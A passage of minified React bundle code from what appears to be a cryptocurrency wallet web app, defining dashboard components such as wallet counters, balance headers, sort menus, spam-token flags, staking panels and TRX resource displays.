          , NT = "dashboard-wallets_allHiddenInfo_1eKYk"
          , TT = "dashboard-wallets_allHiddenSettings_1P1KZ"
          , AT = "dashboard-wallets_wrapperWalletsAndTokens_DJUlb"
          , xT = "dashboard-wallets_showMoreButton_1SnSd"
          , IT = "dashboard-wallets_iconArrow_RpCw6";
        function WalletTypesCounter() {
            const e = (0,
            $.v9)($c)
              , t = (0,
            $.v9)(_s)
              , a = (0,
            $.v9)(bs)
              , n = (0,
            $.v9)(ws)
              , r = (0,
            $.v9)(ks)
              , l = (0,
            $.v9)(Jc)
              , s = (0,
            $.v9)(Qc)
              , i = (0,
            $.v9)(Ss)
              , {defaultWalletsFilter: o} = use_default_wallets_filter()
              , [c,u] = (0,
            O.useState)(0)
              , [d,m] = (0,
            O.useState)(0)
              , [p,f] = (0,
            O.useState)(0);
            (0,
            O.useEffect)(( () => {
                let t = 0;
                if (e.length) {
                    t += e.length;
                    for (let r = 0; r < e.length; r++) {
                        var a;
                        if (null !== (a = e[r].subWallets) && void 0 !== a && a.length) {
                            var n;
                            t += null === (n = e[r].subWallets) || void 0 === n ? void 0 : n.length
                        }
                    }
                }
                t && u(t)
            }
            ), [e, e.length]);
            (0,
            O.useEffect)(( () => {
                l.length && m(l.length)
            }
            ), [l.length]);
            (0,
            O.useEffect)(( () => {
                s.length && f(s.length)
            }
            ), [s.length]);
            const E = (0,
            O.useMemo)(( () => {
                const t = e.flatMap((e => [e, ...e.subWallets || []]));
                return t.reduce(( (e, t) => e + (!1 === o(t) ? 1 : 0)), 0)
            }
            ), [n, t, r, e, a, i]);
            return O.createElement("div", {
                className: yT
            }, O.createElement("span", {
                className: vT
            }, c, " wallets"), O.createElement("span", {
                className: vT
            }, E, " hidden"), O.createElement("span", {
                className: vT
            }, d, " watch only"), O.createElement("span", {
                className: vT
            }, p, " ledger"))
        }
        const PT = a.p + "7f2753a114df5e36bb2ea5747f0bb6f3.svg"
          , LT = a.p + "36a1737e202b4c03c2cc74a68f961db6.svg"
          , FT = "header_headerWrapper_3CW7E"
          , WT = "header_totalBalance_22Zlr"
          , RT = "header_addButtonPlus_2ZwYh"
          , BT = "header_counterLabel_2pp5J"
          , OT = "header_iconsWrapper_my5FK"
          , DT = "header_iconWrapper_2C8AT"
          , MT = "header_icon_2Y7jW"
          , UT = "header_lastIcon_1b25X"
          , GT = a.p + "0c03f188f6ff6fde1e306641aa31ea77.svg"
          , VT = a.p + "0bf91e0bb3f70e208d436989632bda83.svg"
          , KT = {
            wapper: "extra-menu_wapper_3MQJS",
            iconWrapper: "extra-menu_iconWrapper_eKKnp",
            menuWrapper: "extra-menu_menuWrapper_2jpjm",
            list: "extra-menu_list_1i2vV",
            liItem: "extra-menu_liItem_1kHUn",
            arrow: "extra-menu_arrow_3K20z",
            arrowRight: "extra-menu_arrowRight_G5u1V",
            arrowTop: "extra-menu_arrowTop_3Om4y",
            sortBy: "extra-menu_sortBy_2nLhw"
        }
          , HT = [{
            title: "Currency",
            type: Ed
        }, {
            title: "Estimates",
            type: fd
        }, {
            title: "Rating",
            type: hd
        }]
          , ExtraMenu = e => {
            const [t,a] = (0,
            O.useState)(!1)
              , [n,r] = (0,
            O.useState)(!1)
              , l = (0,
            O.useCallback)(( () => {
                a(!1);
                r(!1)
            }
            ), [])
              , s = (0,
            $.I0)()
              , i = undefined
              , o = (0,
            $.v9)(selectedCache).dashboardSortBy || gd
              , c = (0,
            O.useCallback)((e => {
                l();
                s(setCacheKey("dashboardSortBy", e))
            }
            ), []);
            return O.createElement("div", {
                className: KT.wapper
            }, O.createElement("div", {
                className: KT.iconWrapper,
                onClick: () => a(!0)
            }, O.createElement("img", {
                src: GT,
                alt: "Menu"
            })), O.createElement(Xl(), {
                visible: t,
                onClose: l
            }, O.createElement("div", {
                className: KT.menuWrapper
            }, O.createElement("ul", {
                className: KT.list
            }, O.createElement("li", {
                onClick: () => r(!n)
            }, O.createElement("div", {
                className: KT.liItem
            }, "Sort by", O.createElement("img", {
                src: VT,
                alt: "IconArrow",
                className: Ht()(KT.arrow, n && KT.arrowTop)
            }))), n ? O.createElement(O.Fragment, null, HT.map((e => O.createElement("li", {
                key: `fiat-${e.type}`,
                onClick: () => c(e.type)
            }, O.createElement("div", {
                className: Ht()(KT.liItem, KT.sortBy)
            }, o === e.type ? O.createElement("img", {
                src: uf,
                alt: "Check"
            }) : O.createElement("div", null), O.createElement("div", null, e.title)))))) : null, O.createElement("li", null, O.createElement("div", {
                className: KT.liItem,
                onClick: () => {
                    e.createWallet();
                    a(!1)
                }
            }, O.createElement("div", {
                className: Ht()(KT.iconWrapper)
            }, O.createElement("img", {
                src: LT,
                className: KT.icon,
                alt: "Import or create wallet"
            })), "Add wallet", O.createElement("img", {
                src: VT,
                alt: "IconArrow",
                className: Ht()(KT.arrow, KT.arrowRight)
            }))), (0,
            M.tq)() || (0,
            M.p1)() ? null : O.createElement("li", null, O.createElement(Y.OL, {
                to: "/app/wallet-management",
                className: KT.liItem
            }, O.createElement("div", {
                className: Ht()(KT.iconWrapper)
            }, O.createElement("img", {
                src: PT,
                className: KT.icon,
                alt: "Settings"
            })), "Settings", O.createElement("img", {
                src: VT,
                alt: "IconArrow",
                className: Ht()(KT.arrow, KT.arrowRight)
            })))))))
        }
        ;
        function WalletListHeader(e) {
            let {onGlassClick: t} = e;
            const a = (0,
            $.v9)($c)
              , n = (0,
            $.I0)()
              , [r] = total_balance()
              , l = usePopup()
              , openPopupCreate = () => {
                n(rd.setNewCreatedWalletId({
                    walletId: null
                }));
                l.open("import-or-create", {
                    initialTab: "create"
                })
            }
              , s = (0,
            O.useMemo)(( () => r(a)), [a])
              , i = (0,
            O.useRef)(null)
              , [o,c] = (0,
            O.useState)(!1)
              , updateExtraMenuVisibility = () => {
                var e, t;
                const a = null !== (e = null === (t = i.current) || void 0 === t ? void 0 : t.textContent) && void 0 !== e ? e : "";
                c(a.length > 8)
            }
            ;
            (0,
            O.useEffect)(( () => {
                updateExtraMenuVisibility()
            }
            ), [i]);
            (0,
            O.useEffect)(( () => {
                const e = new MutationObserver(( () => {
                    updateExtraMenuVisibility()
                }
                ));
                i.current && e.observe(i.current, {
                    childList: !0,
                    characterData: !0,
                    subtree: !0
                });
                return () => e.disconnect()
            }
            ), []);
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: FT
            }, O.createElement("div", {
                className: WT
            }, O.createElement("span", {
                ref: i
            }, O.createElement(fiat_estimate_FiatEstimate, {
                value: s
            })), O.createElement(sT, null)), O.createElement(UpdateBalance, {
                all: !0
            }), O.createElement("div", {
                className: OT
            }, O.createElement("div", {
                className: DT,
                onClick: t
            }, O.createElement("img", {
                src: cS,
                className: MT,
                alt: "Glass"
            })), o ? O.createElement(O.Fragment, null, O.createElement(ExtraMenu, {
                createWallet: openPopupCreate
            })) : O.createElement(O.Fragment, null, O.createElement(SortByDashboard, {
                withIcon: !0
            }), O.createElement("div", {
                className: DT,
                onClick: openPopupCreate
            }, O.createElement("img", {
                src: LT,
                className: MT,
                alt: "Import or create wallet"
            })), !(0,
            M.tq)() && !(0,
            M.p1)() && O.createElement(Y.OL, {
                to: "/app/wallet-management",
                className: Ht()(DT, UT)
            }, O.createElement("img", {
                src: PT,
                className: MT,
                alt: "Settings"
            }))))), O.createElement(WalletTypesCounter, null))
        }
        const zT = WalletListHeader
          , jT = "TYPE_SECTION_CLO"
          , $T = "TYPE_SECTION_TOKENS"
          , ZT = "TYPE_SECTION_INFO"
          , YT = "TYPE_FIO_INFO"
          , qT = "TYPE_SECTION_TRX"
          , XT = "TYPE_SECTION_HD_ADDRESSES"
          , QT = "TYPE_SECTION_XMR"
          , JT = "TYPE_SECTION_MULTISIGS"
          , eA = "TYPE_SECTION_KMD_CLAIM"
          , tA = "TYPE_SECTION_NEO_CLAIM"
          , aA = "TYPE_SECTION_TRX_STAKING"
          , nA = "TYPE_SECTION_XTZ_STAKING"
          , rA = "TYPE_SECTION_ONE_STAKING"
          , lA = "TYPE_SECTION_ATOM_STAKING"
          , sA = "TYPE_SECTION_EOS_STAKING"
          , iA = "TYPE_SECTION_NOW_STAKING"
          , oA = "TYPE_SECTION_ADA_STAKING"
          , cA = "TYPE_SECTION_ONT_STAKING"
          , uA = "TYPE_SECTION_ZIL_STAKING"
          , dA = "TYPE_SECTION_ETH_STAKING"
          , mA = "TYPE_SECTION_XRP_SPARK_AIRDROP"
          , pA = "TYPE_SECTION_BCH_SPLIT"
          , fA = {
            iconCurrency: "wallet-item_iconCurrency_17djy",
            isTestnet: "wallet-item_isTestnet_3TWWS",
            isClick: "wallet-item_isClick_3Tbh-",
            walletBlock: "wallet-item_walletBlock_2oSdL",
            wrapperBeforeCurrency: "wallet-item_wrapperBeforeCurrency_3Kgij",
            walletInfo: "wallet-item_walletInfo_mFfvd",
            balanceBlock: "wallet-item_balanceBlock_2R34G",
            cryptoBalance: "wallet-item_cryptoBalance_1O_qf",
            balanceContainer: "wallet-item_balanceContainer_2PULW",
            fiatBalance: "wallet-item_fiatBalance_1-3ZQ",
            titleWallet: "wallet-item_titleWallet_3TNQn",
            titleWrapper: "wallet-item_titleWrapper_28HDy",
            isStakingButton: "wallet-item_isStakingButton_3Immk",
            isNewButton: "wallet-item_isNewButton_12z6w",
            fiatType: "wallet-item_fiatType_1HHe5",
            watchOnly: "wallet-item_watchOnly_15c09",
            tickerWallet: "wallet-item_tickerWallet_3-PSh"
        }
          , EA = "parent-wallet-of-token_parentWalletBlock_1ddBP"
          , hA = "parent-wallet-of-token_iconCurrency_3S_T6"
          , gA = "parent-wallet-of-token_title_1TBK8";
        function ParentWalletOfToken(e) {
            let {wallet: t} = e;
            const a = t ? `${(0,
            be.xG)(t.currency)} - ${t.title}` : "";
            return O.createElement("div", {
                className: EA
            }, O.createElement(IconCurrency, {
                currency: null == t ? void 0 : t.currency,
                className: hA
            }), O.createElement("span", {
                className: gA
            }, a))
        }
        const yA = O.memo(ParentWalletOfToken)
          , useSpamAndUnknownToken = e => {
            let {family: t, smartContract: a, onlySpamToken: n} = e;
            const r = (0,
            $.I0)()
              , l = (0,
            $.v9)(Md)
              , s = (0,
            $.v9)(Wi)
              , i = (0,
            $.v9)(Bo)
              , o = (0,
            O.useMemo)(( () => {
                if (!t || !a || !0 === i)
                    return !1;
                const e = undefined;
                return t.toLowerCase() + a.toLowerCase()in l
            }
            ), [t, a, l, i])
              , c = (0,
            O.useMemo)(( () => {
                if (n || !t || !a || 0 === Object.keys(s).length || !0 === i)
                    return !1;
                const e = `${null == t ? void 0 : t.toLowerCase()}:${a.toLowerCase()}`
                  , r = undefined;
                return void 0 === s[e]
            }
            ), [t, a, s, i]);
            (0,
            O.useEffect)(( () => {
                Object.keys(l).length || r(hh.fetchSpamTokenList())
            }
            ), [r]);
            return {
                isSpamToken: o,
                isUnknownToken: c
            }
        }
          , vA = a.p + "60ae0cd811fe02dfd5dfb3f35d573b93.svg"
          , _A = {
            tooltip: "unknown-token-notify_tooltip_1cwbH",
            selected: "unknown-token-notify_selected_24RoH",
            inList: "unknown-token-notify_inList_12i67",
            exchangeInList: "unknown-token-notify_exchangeInList_3GFZI",
            borrowSelected: "unknown-token-notify_borrowSelected_1TC4k",
            borrowInList: "unknown-token-notify_borrowInList_3ECeK",
            txList: "unknown-token-notify_txList_HrmTu"
        }
          , UnknownTokenNotify_UnknownTokenNotify = e => {
            let {family: t, type: a} = e;
            return t ? O.createElement(tooltip, {
                classNameWrapper: Ht()(_A.tooltip, a && _A[a]),
                text: `This is an unknown ${t.toUpperCase()} token`,
                width: "180px",
                type: "error"
            }, O.createElement("img", {
                src: vA,
                width: 16,
                height: 16,
                alt: "svg tooltip"
            })) : null
        }
        ;
        function walletHasStaking(e) {
            if (wallets_util_isMultisig(e))
                return !1;
            const t = void 0 === e.family && ("ada-shelley" === e.currency || "atom" === e.currency || "clo" === e.currency || "eos" === e.currency || "eth" === e.currency || "kmd" === e.currency || "neo" === e.currency || "one" === e.currency || "ont" === e.currency || "ropsten" === e.currency && M.CM || "trx" === e.currency || "xtz" === e.currency || "zil" === e.currency || "zil-testnet" === e.currency)
              , a = "bnb" === e.family && ("now-e68" === e.currency || "now" === e.currency);
            return t || a
        }
        const GlobalWalletItemBlock = e => {
            var t;
            let {children: a, className: n, isNew: r=!1, onClick: l, wallet: s, isMultisig: i, subItem: o} = e;
            const {currency: c, family: u, smartContract: d} = s
              , m = (0,
            $.v9)(_s)
              , p = (0,
            $.v9)(lu)
              , [f,E] = (0,
            O.useState)(null)
              , h = walletHasStaking(s)
              , g = m.indexOf(s.uuid) > -1
              , y = `${(0,
            be.xG)(s.currency)} wallet`
              , v = null === (t = Se.Z.getMetadataByWallet(s)) || void 0 === t ? void 0 : t.features.isActiveBalance
              , _ = s.isTestnet
              , w = s.isSubWallet
              , b = s.hw
              , k = s.watchOnly
              , {isSpamToken: S, isUnknownToken: C} = useSpamAndUnknownToken({
                family: u,
                smartContract: d
            });
            (0,
            O.useEffect)(( () => {
                if ((w || i) && s.uuid) {
                    const e = p(s.uuid);
                    e && E(e)
                }
            }
            ), [p, i, w, s]);
            function getBalance() {
                const e = typeof s.balance;
                return Number.isNaN(parseFloat(s.balance)) || -1 === ["string", "number"].indexOf(e) ? "xmr" === c ? null : "..." : s.balance
            }
            const {convertToFiat: N} = useConverter();
            (0,
            Cd.Y)(s);
            function handleClickWallet(e) {
                if (l) {
                    const t = "fio" === s.currency ? YT : ZT;
                    l(t, s)(e)
                }
            }
            function handleStakingClick(e) {
                e && e.stopPropagation();
                if (l) {
                    const t = "fio" === s.currency ? YT : ZT;
                    l(t, s, "staking")(e)
                }
            }
            const renderCurrencyTicker = () => {
                const e = (0,
                be.xG)(s.currency);
                return e && e.length > 5 ? `${e.slice(0, 5)}...` : e
            }
            ;
            return O.createElement("div", {
                onClick: handleClickWallet,
                className: Ht()(n, fA.walletBlock, {
                    [fA.isClick]: !!l,
                    [fA.isHidden]: g
                })
            }, O.createElement(IconCurrency, {
                currency: s.currency,
                className: Ht()(fA.iconCurrency, {
                    [fA.isTestnet]: _
                }),
                isHidden: g
            }), S ? O.createElement(SpamTokenNotify_SpamTokenNotify, {
                family: u
            }) : C && O.createElement(UnknownTokenNotify_UnknownTokenNotify, {
                family: u
            }), r && O.createElement("span", {
                className: fA.isNewButton
            }, "NEW"), h && O.createElement("div", {
                className: fA.isStakingButton,
                onClick: handleStakingClick
            }, "STAKING"), O.createElement("div", {
                className: fA.wrapperBeforeCurrency
            }, O.createElement("div", {
                className: fA.walletInfo
            }, O.createElement("div", {
                className: fA.titleWallet
            }, O.createElement("div", {
                className: fA.titleWrapper
            }, s.title || y), O.createElement("span", {
                className: fA.tickerWallet
            }, renderCurrencyTicker())), o, (w || i) && f && O.createElement(yA, {
                wallet: f
            })), v && O.createElement("div", {
                className: fA.balanceBlock
            }, O.createElement(sb, null, O.createElement("div", {
                className: fA.cryptoBalance,
                title: `${(0,
                Ko.i1)(getBalance(), void 0, c)} ${(0,
                be.xG)(s.currency)}`
            }, O.createElement("span", {
                className: fA.balanceContainer
            }, (0,
            Ko.i1)(getBalance(), 8, c, !0))), O.createElement("div", {
                className: fA.fiatBalance
            }, i && O.createElement("span", null, "multisig "), b && O.createElement("span", null, s.hw, " "), k && O.createElement("span", null, "WO "), _ && O.createElement("span", null, "testnet "), O.createElement(fiat_estimate_FiatEstimate, {
                value: N(getBalance(), s),
                renderCurrency: !0,
                withIcon: !0,
                dashBoard: !0
            })))), a))
        }
          , wA = GlobalWalletItemBlock
          , bA = {
            list: []
        }
          , kA = "@settings/UPDATE_NEW_WALLETS"
          , SA = ["list"]
          , CA = "new-wallets"
          , NA = (0,
        Ru.Z)({
            [kA]: (e, t) => {
                let {list: a} = t;
                return {
                    ...e,
                    list: [...a]
                }
            }
            ,
            CLEAR_ALL_DATA: () => ({
                list: []
            })
        }, bA)
          , TA = 288e4;
        function new_wallets_filterWallets(e) {
            const t = Date.now();
            return e.filter((e => e.createdAt + TA > t))
        }
        const selectedNewList = e => new_wallets_filterWallets(e[CA].list || [])
          , selectedNewWallets = e => new_wallets_filterWallets(e[CA].list || []).map((e => e.uuid))
          , setNewWallet = e => (t, a) => {
            const n = a()
              , r = selectedNewList(n);
            r.push({
                uuid: e.uuid,
                createdAt: Date.now()
            });
            t({
                type: kA,
                list: new_wallets_filterWallets(r)
            })
        }
          , AA = "wallet-item_title_2vyEH"
          , xA = "wallet-item_toggle_D15HH"
          , IA = "wallet-item_item_1RYBo"
          , PA = "wallet-item_isActive_1_7Ue"
          , LA = "wallet-item_estimatedBalance_1vQUC"
          , FA = "wallet-item_dash_1tKqY"
          , WA = "wallet-item_supText_3CI75"
          , RA = "wallet-item_stakingsWrapper_2VYEJ"
          , BA = "wallet-item_subInformationBlock_1NEd1"
          , OA = "wallet-item_xmrCenterWrapper_30hIQ"
          , DA = {
            wrapper: "eth_wrapper_2fkKA main_block_15zml",
            buttonLink: "eth_buttonLink_lzt7I",
            addLink: "eth_addLink_1QLgk",
            collectionTitle: "eth_collectionTitle_2w01c",
            titleSection: "eth_titleSection_2iRx-",
            emptyState: "eth_emptyState_9MRfl",
            collectionBlock: "eth_collectionBlock_3k5bW",
            item: "eth_item_2dHMN",
            userSelect: "eth_userSelect_1OFra",
            mt20: "eth_mt20_1PHVx",
            label: "eth_label_3SRSD"
        }
          , HbarLinkInformation = e => {
            const t = (0,
            j.k6)()
              , {wallet: a, className: n, children: r} = e
              , {currency: l} = a || {}
              , s = undefined;
            if (!(l && ["hbar", "hbar-testnet"].includes(l)))
                return null;
            const handleOpenAddToken = a => {
                var n;
                a.stopPropagation();
                const r = {
                    walletFrom: null == e || null === (n = e.wallet) || void 0 === n ? void 0 : n.uuid
                };
                t.push({
                    pathname: (0,
                    M.RU)("/add-token-hbar"),
                    search: objectToString(r)
                })
            }
            ;
            return O.createElement("div", {
                className: Ht()(DA.mt20, DA.buttonLink, n)
            }, O.createElement("span", {
                onClick: handleOpenAddToken,
                className: DA.addLink,
                id: "addTokens"
            }, "Add token"), r)
        }
          , MA = {
            dotWrapper: "wallet-dot-update_dotWrapper_12rSa",
            failedTxs: "wallet-dot-update_failedTxs_34mTn",
            failedBalance: "wallet-dot-update_failedBalance_15r6I",
            failedTime: "wallet-dot-update_failedTime_1Bxgc",
            socketUpdateStart: "wallet-dot-update_socketUpdateStart_j3i-a",
            "blink-animation": "wallet-dot-update_blink-animation_3iAC3"
        };
        function WalletDotUpdate(e) {
            var t;
            let {wallet: a} = e;
            const n = (0,
            $.v9)(Wo);
            if (!M.CM)
                return null;
            if (!a)
                return null;
            if (!n || !n[a.uuid])
                return null;
            const r = n[a.uuid];
            let l;
            r.statusTxs || (l = "failedTxs");
            r.statusBalance || (l = "failedBalance");
            r.updateTime < Date.now() - 6e4 && (l = "failedTime");
            r.updateTime < Date.now() - 18e4 && (l = "failedLongTime");
            "failedLongTime" === l && ro.isCurrencySupported(a.currency) && (l = "socketUpdateStart");
            return O.createElement("div", {
                className: Ht()(MA.dotWrapper, MA[null !== (t = l) && void 0 !== t ? t : "undefined"]),
                title: JSON.stringify([l, r])
            })
        }
        const getSparkAirdropInformation = async (e, t) => {
            const a = undefined;
            return (await Se.Z.getApiByCurrency(e)).getSparkAirdropInfo(t)
        }
        ;
        function MobilePanels(e) {
            var t;
            let {wallet: a, onClick: n} = e;
            const r = hasMultisigByWallet(a)
              , [l,s] = (0,
            O.useState)({
                status: !1
            });
            (0,
            O.useEffect)(( () => {
                async function loadSparkAirdropInformation() {
                    try {
                        const e = await getSparkAirdropInformation(null == a ? void 0 : a.currency, null == a ? void 0 : a.address);
                        s(e)
                    } catch {}
                }
                "xrp" === (null == a ? void 0 : a.currency) && loadSparkAirdropInformation()
            }
            ), [null == a ? void 0 : a.currency, null == a ? void 0 : a.address]);
            const i = [];
            if (!a)
                return i;
            const o = !a.subWalletsHidden && (null === (t = Se.Z.getRootMetadata(a.currency)) || void 0 === t ? void 0 : t.token);
            !a.isWatchOnly && r && i.push(O.createElement(O.Fragment, {
                key: `${a.uuid}panel-multisigs`
            }, O.createElement("span", {
                className: xA,
                onClick: n(JT, a)
            }, O.createElement("span", {
                className: AA
            }, "Multisigs"))));
            if ("trx" === a.currency && !a.isWatchOnly) {
                i.push(O.createElement(O.Fragment, {
                    key: `${a.uuid}panel-trxstaking`
                }, r && O.createElement("span", {
                    className: FA
                }, "–"), O.createElement("span", {
                    className: xA,
                    onClick: n(aA, a),
                    id: "openTRXStakingTab"
                }, "Staking"), O.createElement("span", {
                    className: FA
                }, "–")));
                i.push(O.createElement(O.Fragment, {
                    key: `${a.uuid}panel-trxbw`
                }, O.createElement("span", {
                    className: xA,
                    onClick: n(qT, a)
                }, "BW points")))
            }
            "xmr" !== a.currency && "xmr-testnet" !== a.currency || i.push(O.createElement("span", {
                className: xA,
                onClick: n(QT, a),
                key: `${a.uuid}panel-xmr`
            }, "Sync information"));
            a.isWatchOnly || "xtz" !== a.currency || i.push(O.createElement("span", {
                className: xA,
                onClick: n(nA, a),
                key: `${a.uuid}panel-xtz`,
                id: "openXTZStakingTab"
            }, "Staking"));
            a.isWatchOnly || "one" !== a.currency || i.push(O.createElement("span", {
                className: xA,
                onClick: n(rA, a),
                key: `${a.uuid}panel-one`,
                id: "openONEStakingTab"
            }, "Staking"));
            a.isWatchOnly || "now-e68" !== (null == a ? void 0 : a.currency) || i.push(O.createElement(O.Fragment, {
                key: `${a.uuid}panel-bnb`
            }, O.createElement("span", {
                className: xA,
                onClick: n(iA, a),
                id: "openNOWe68StakingTab"
            }, "Staking")));
            a.isWatchOnly || "eth" !== a.currency || i.push(O.createElement(O.Fragment, {
                key: `${a.uuid}panel-eth`
            }, r && O.createElement("span", {
                className: FA
            }, "–"), O.createElement("span", {
                className: xA,
                onClick: n(dA, a),
                id: "openETHStakingTab"
            }, "Staking")));
            !a.isWatchOnly && "ropsten" === a.currency && M.CM && i.push(O.createElement(O.Fragment, {
                key: `${a.uuid}panel-eth`
            }, O.createElement("span", {
                className: FA
            }, "–"), O.createElement("span", {
                className: xA,
                onClick: n(dA, a),
                id: "openRopstenStakingTab"
            }, "Staking")));
            a.isWatchOnly || "zil" !== a.currency && "zil-testnet" !== a.currency || i.push(O.createElement("span", {
                className: xA,
                onClick: n(uA, a),
                key: `${a.uuid}panel-zil`,
                id: "openZILStakingTab"
            }, "Staking"));
            a.isWatchOnly || "eos" !== a.currency || i.push(O.createElement(O.Fragment, {
                key: `${a.uuid}panel-eos`
            }, O.createElement("span", {
                className: xA,
                onClick: n(sA, a),
                id: "openEOSStakingTab"
            }, "Staking")));
            a.isWatchOnly || "atom" !== a.currency || i.push(O.createElement("span", {
                className: xA,
                onClick: n(lA, a),
                key: `${a.uuid}panel-atom`,
                id: "openATOMStakingTab"
            }, "Staking"));
            a.isWatchOnly || "neo" !== a.currency || i.push(O.createElement(O.Fragment, {
                key: `${a.uuid}panel-neo`
            }, O.createElement("span", {
                className: xA,
                onClick: n(tA, a)
            }, "Claim Gas")));
            a.type === we.uQ.BTC_LIKE_SEGWIT_WALLET && a.hw === we.Vw.LEDGER && i.push(O.createElement(O.Fragment, {
                key: `${a.uuid}panel-hd`
            }, o && O.createElement("span", {
                className: FA
            }, "–"), O.createElement("span", {
                className: xA,
                onClick: n(XT, a)
            }, "HD addresses")));
            a.isWatchOnly || "kmd" !== a.currency || i.push(O.createElement("span", {
                className: xA,
                onClick: n(eA, a),
                key: `${a.uuid}panel-kmd`,
                id: "claimKomodo"
            }, "Claim"));
            a.isWatchOnly || "ada-shelley" !== a.currency && "ada" !== a.currency || i.push(O.createElement("span", {
                className: xA,
                onClick: n(oA, a),
                key: `${a.uuid}panel-ada`,
                id: "openADAStakingTab"
            }, "Staking"));
            !a.isWatchOnly && "xrp" === a.currency && null != l && l.status && i.push(O.createElement("span", {
                className: xA,
                onClick: n(mA, a),
                key: `${a.uuid}panel-xrp`,
                id: "sparkAirdrop"
            }, "Airdrop"));
            a.isWatchOnly || "clo" !== a.currency || i.push(O.createElement("span", {
                className: xA,
                onClick: n(jT, a),
                key: `${a.uuid}panel-clo`,
                id: "openCLOStakingTab"
            }, "Staking"));
            !a.isWatchOnly && ["hbar", "hbar-testnet"].includes(a.currency) && i.push(O.createElement(HbarLinkInformation, {
                wallet: a,
                className: WA,
                key: `${a.uuid}panel-hbar`
            }));
            a.isWatchOnly || "ont" !== a.currency || i.push(O.createElement(O.Fragment, {
                key: `${a.uuid}panel-ontstaking`
            }, O.createElement("span", {
                className: xA,
                onClick: n(cA, a),
                id: "openONTStakingTab"
            }, "Staking")));
            i.push(O.createElement(WalletDotUpdate, {
                wallet: a,
                key: `${a.uuid}update-status`
            }));
            return i
        }
        const UA = MobilePanels;
        function useRenderSubItem(e) {
            let {wallet: t, onClick: a} = e;
            return t ? t.multisigId ? () => null : () => {
                const e = [];
                if ((0,
                M.tq)() || (0,
                M.p1)()) {
                    const n = UA({
                        wallet: t,
                        onClick: a
                    });
                    n && n.length && e.push(...n)
                }
                return O.createElement("div", null, e)
            }
            : () => null
        }
        const GA = a.p + "fb47dc2727de4023060c7bb79f48d573.svg";
        function Image(e) {
            let {src: t, alt: a, className: n} = e;
            const [r,l] = (0,
            O.useState)(!0);
            return O.createElement(O.Fragment, null, O.createElement("img", {
                className: n || "",
                src: t,
                onLoad: () => l(!1),
                hidden: r,
                alt: ""
            }), r && a)
        }
        const VA = Image
          , KA = {
            wrapper: "trx_wrapper_1h-CI main_block_15zml",
            relativeWrapper: "trx_relativeWrapper_2FRE2",
            label: "trx_label_2lIel",
            points: "trx_points_27HO4",
            progressInner: "trx_progressInner_3fQ2q",
            rowPoint: "trx_rowPoint_2p5XI",
            addressContainer: "trx_addressContainer_oGOQJ",
            claimLink: "trx_claimLink_VSOcs",
            desc: "trx_desc_ZpRGw",
            buttonLink: "trx_buttonLink_1jG_y",
            external: "trx_external_2G21V",
            error: "trx_error_1X9Xl",
            userSelect: "trx_userSelect_uvDPs",
            loader: "trx_loader_3R14Y",
            value: "trx_value_QwGjc",
            row: "trx_row_3ZErY",
            block: "trx_block_3tdaQ",
            blockButton: "trx_blockButton_2GRg8"
        }
          , StaticProgressBar = e => {
            let {pointsAvailable: t, pointsLimit: a} = e;
            const n = (0,
            O.useRef)(null)
              , r = (0,
            O.useRef)(null);
            (0,
            O.useLayoutEffect)((function forceInnerSize() {
                if (n.current && r.current) {
                    const e = n.current.offsetWidth
                      , l = Math.ceil(t / (a / 100))
                      , s = Number.isNaN(l) ? 0 : Math.ceil(e / 100 * l);
                    r.current.style.width = `${s}px`
                }
            }
            ), [t, a]);
            return O.createElement("div", {
                ref: n,
                style: {
                    background: "#C4C4C4",
                    height: 4,
                    borderRadius: 4,
                    overflow: "hidden"
                }
            }, O.createElement("div", {
                ref: r,
                style: {
                    background: "#7190EB",
                    height: 4,
                    width: 0,
                    borderRadius: 4
                },
                className: KA.progressInner
            }))
        }
          , ResourcePoints = e => {
            let {title: t, isLoading: a, pointsAvailable: n, pointsLimit: r} = e;
            const l = (0,
            O.useMemo)((function toHumanReadable() {
                if (a)
                    return O.createElement(O.Fragment, null, O.createElement(StaticProgressBar, {
                        pointsAvailable: 0,
                        pointsLimit: 0
                    }), O.createElement(LoaderDots, {
                        visible: !0
                    }));
                if ([n, r].includes("NaN"))
                    return O.createElement(O.Fragment, null, O.createElement(StaticProgressBar, {
                        pointsAvailable: 0,
                        pointsLimit: 0
                    }), O.createElement("div", null, "N/A"));
                const e = parseInt(n || "0", 10) || 0
                  , t = parseInt(r || "0", 10) || 0;
                return O.createElement(O.Fragment, null, O.createElement(StaticProgressBar, {
                    pointsAvailable: e,
                    pointsLimit: t
                }), O.createElement("div", null, n || "?", "/", r || "?"))
            }
            ), [a, n, r]);
            return O.createElement("div", {
                className: KA.points
            }, O.createElement("div", null, t), l)
        }
          , TrxResources = e => {
            let {address: t, uuid: a} = e;
            const n = (0,
            $.I0)()
              , r = (0,
            $.v9)((e => Oc(e, a)));
            (0,
            O.useEffect)((function fetchTrxResourcesOnUpdate() {
                n(td({
                    address: t,
                    walletId: a
                }))
            }
            ), [t, a, n]);
            const l = void 0 === r || r.loading
              , s = null == r ? void 0 : r.resources;
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: KA.row
            }, O.createElement(ResourcePoints, {
                title: "Bandwidth Points:",
                isLoading: l,
                pointsAvailable: null == s ? void 0 : s.netAvailable,
                pointsLimit: null == s ? void 0 : s.netLimit
            })), O.createElement("div", {
                className: KA.row
            }, O.createElement(ResourcePoints, {
                title: "Energy:",
                isLoading: l,
                pointsAvailable: null == s ? void 0 : s.energyAvailable,
                pointsLimit: null == s ? void 0 : s.energyLimit
            })))
        }
          , TrxResourcesInformation = e => {
            let {wallet: t} = e;
            return "trx" !== t.currency ? null : t.uuid && t.address ? O.createElement("div", {
                className: KA.wrapper
            }, O.createElement(label, {
                className: KA.label
            }, O.createElement("span", null, "TRX Resources"), O.createElement(tooltip, {
                text: "If the account runs out of resources, the network fee is charged in TRX"
            }, O.createElement(VA, {
                src: GA,
                alt: ""
            }))), O.createElement(TrxResources, {
                uuid: t.uuid,
                address: t.address
            }), O.createElement("div", {
                className: KA.rowBetween
            }, O.createElement("div", null), O.createElement("a", {
                className: KA.buttonLink,
                href: "https://developers.tron.network/docs/resource-model",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Learn more about TRX resources", O.createElement("img", {
                src: Bp,
                className: KA.external,
                alt: ""
            })))) : null
        }
          , HA = {
            wrapper: "one_wrapper_2t5ys main_block_15zml",
            wrapperPanel: "one_wrapperPanel_1ihK5",
            link: "one_link_2yCdz",
            buttonCopy: "one_buttonCopy_2ofEz",
            external: "one_external_pwuHp",
